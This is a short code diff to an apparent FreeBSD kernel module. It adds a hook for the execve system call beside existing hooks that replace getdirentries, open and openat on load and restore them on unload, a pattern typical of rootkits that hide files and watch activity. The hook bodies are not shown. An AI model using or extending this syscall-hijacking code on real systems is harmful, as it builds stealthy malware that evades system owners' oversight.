@@ -125,6 +125,7 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
 		sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
 		sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
+		sysent[SYS_execve].sy_call = (sy_call_t *)hook_sys_execve;
 		// sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
 		// sysent[SYS_write].sy_call = (sy_call_t *)hook_sys_write;
 
@@ -142,6 +143,7 @@ static int load(struct module *module, int cmd, void *arg) {
 		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
 		sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
 		sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
+		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
 		// sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
 		// sysent[SYS_write].sy_call = (sy_call_t *)sys_write;
 
